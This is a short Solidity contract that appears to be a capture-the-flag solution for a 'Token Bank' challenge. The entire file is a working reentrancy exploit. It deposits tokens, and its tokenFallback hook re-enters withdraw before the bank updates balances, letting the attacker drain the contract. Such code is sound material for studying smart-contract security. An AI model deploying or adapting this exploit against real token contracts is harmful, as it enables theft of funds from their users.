// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma abicoder v1;

interface ITokenBankChallenge {
    function withdraw(uint256 amount) external;
}

interface ISimpleERC223Token {
    function transfer(address to, uint256 value) external returns (bool success);
}

contract V2DosCompletos {
    
    ISimpleERC223Token tokenContract;
    ITokenBankChallenge challengeContract;
    bool called;
    bool enabled;

    constructor(ISimpleERC223Token _tokenContract, ITokenBankChallenge _challengeContract) {
        tokenContract = _tokenContract;
        challengeContract = _challengeContract;
    }

    function enable() public {
        require(tokenContract.transfer(address(challengeContract), 500000 * 10**18) == true);
        enabled = true;
    }

    function attack() public {
        challengeContract.withdraw(500000 * 10**18);
    }

     function tokenFallback(address from, uint256 value, bytes memory data) external {
         if (enabled == true && called == false) {
             called = true;
             attack();
         }
     }
}